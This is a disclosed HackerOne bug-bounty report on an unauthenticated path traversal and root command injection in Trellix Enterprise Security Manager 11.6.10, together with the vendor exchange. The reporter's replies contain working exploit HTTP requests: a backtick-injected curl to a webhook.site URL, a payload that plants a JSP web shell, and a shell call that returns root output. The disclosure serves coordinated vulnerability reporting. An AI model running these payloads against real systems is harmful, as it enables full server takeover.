---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
date: 2025-01-12
submitted: 2024-11-02T14:40:47.714Z
bounty_usd: null
votes: 60
cve: []
program: "[[programs/trellix|Trellix]]"
reporter: "r4v"
source: "https://hackerone.com/reports/2817658"
title: "Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10"
---
# Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 60 | **Program:** Trellix | **Disclosed:** 2025-01-12

- Report: [https://hackerone.com/reports/2817658](https://hackerone.com/reports/2817658)
- CWE: OS Command Injection
- Submitted: 2024-11-02T14:40:47.714Z

## Report summary

A critical unauthenticated path traversal and command injection vulnerability was identified in Trellix Enterprise Security Manager (ESM) 11.6.10. The ESM's AJP configuration (`ProxyPass /rs ajp://localhost:8009/rs`) allows unauthorized access to internal API endpoints by exploiting a `..;/` path traversal sequence, bypassing directory restrictions. The `/Snowservice/SnowflexAdminServices/ManageNode` endpoint is further vulnerable to command injection in the `name` parameter, allowing remote code execution as root. This vulnerability permits full system compromise via a reverse shell. 

*Tested on version 11.6.10. Other versions may be affected.*

## Timeline

- **Draft Started**
- **Report Filed**
- **2024-11-04** @yps: Hi @ @r4v,

Thank you for taking time to submit the issue , our engineering team is reviewing the report, we will keep you updated.

Regards,
@yps
- **Report Triaged**
- **2024-11-08** @yps: Hi @r4v, 

Can you share the output in burp of the command injection  other than reverse shell ?

Regards,
@yps
- **2024-11-10** @r4v: I am not sure if I understand the question correctly, but for reverse shell the HTTP response will be most probably timeout or something. Only if you exit from reverse shell it manually, the response would be
```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:17:45 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 15
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"status":"OK"}
```
otherwise it could be similar to:

```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:29:52 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 128
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"addlInfo":"org.apache.thrift.transport.TTransportException: java.net.SocketTimeoutException: Read timed out","status":"error"}
```

If you're (for some reason) unable to reproduce the vulnerability with reverse shell, you may try with Burp Collaborator or Webhook.site.

Sample request:

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: 192.168.15.225
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 207

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`curl http://webhook.site/acde4291-64b0-4c2d-b4e3-0c3aeb881c6e`", 
            "signal": "Restart"
        }
    ]
}

```

Sample response:
```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:20:14 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 15
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"status":"OK"}
```
And then observe the incoming HTTP request in Burp Collaborator/Webhook.site.

I didn't investigate the HTTP response is this case, as for remote code execution there are multiple ways obtain the output from the command (without relying on HTTP response), such as reverse shell. However, in case attacker would not be able to obtain reverse shell (e.g. due to the strict firewall rules in the company), there's still possibility to drop webshell in existing webserver. To do so, submit the following request:

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: 192.168.15.225
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 419

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`echo '<% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream in = p.getInputStream(); int a = -1; while ((a = in.read()) != -1) out.print((char)a); } %>' > /etc/tomcat/webapps/ROOT/shell.jsp`", 
            "signal": "Restart"
        }
    ]
}
```

The response should be like:

```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:50:23 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 15
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"status":"OK"}
```

Then just navigate to our webshell with submitting sample command (id):

```http
GET /rs/..;/shell.jsp?cmd=id HTTP/1.0
Host: 192.168.15.225
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36

```

and observe the response:

```
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:50:38 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Set-Cookie: █████████
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 40
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

uid=0(root) gid=0(root) groups=0(root)

```
- **2024-11-12** @yps: Hi @r4v,

Thank you for your response, we were able to validate both vulnerabilities. Will keep you posted with any further updates.

Regards,
@yps
- **2024-11-14** @yps: Hi @r4v,

We are planning to release the fix and publish a bulletin and CVE. How would you like to be credited in the bulletin.

Regards,
@yps
- **2024-11-15** @r4v: Just name and surname will be fine, as it's my private research: Rafal Gill

Will the bulletin be public or only available to customers? If only to customers, can I receive the access to it after it will be published?
- **2024-11-20** @yps: Hi @r4v,

The bulletin will be available only for customers and we can share you a copy after it is published.

Regards,
@yps
- **Report Resolved**
- **2024-12-13** @r4v: Hello @yps ,

Thanks for that PDF and for the CVE. Can we disclose it e.g. in 14 days? I believe that ~30 days after releasing patch would be safe enough for your customers to disclose.

Best regards,

Rafał Gill
- **Agreed On Going Public**
- **Report Became Public**
